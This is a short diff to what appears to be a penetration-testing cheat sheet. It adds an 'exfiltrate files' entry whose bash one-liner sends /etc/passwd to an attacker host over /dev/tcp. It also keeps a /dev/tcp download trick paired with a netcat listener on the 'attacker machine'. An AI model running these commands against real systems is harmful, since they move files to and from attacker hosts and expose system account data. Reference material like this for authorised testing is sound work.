@@ -64,8 +64,12 @@ hostname -I
     -i, --ip-address       addresses for the host name
     -I, --all-ip-addresses all addresses for the host
 
-# download files with just bash ## exfiltrate files bash pipe tcp
+# download files with just bash 
 ```bash
 bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 ```
 On attacker machine, `nc -lvnp $LPORT < filename`
+# exfiltrate files bash pipe tcp
+```bash
+bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
+```
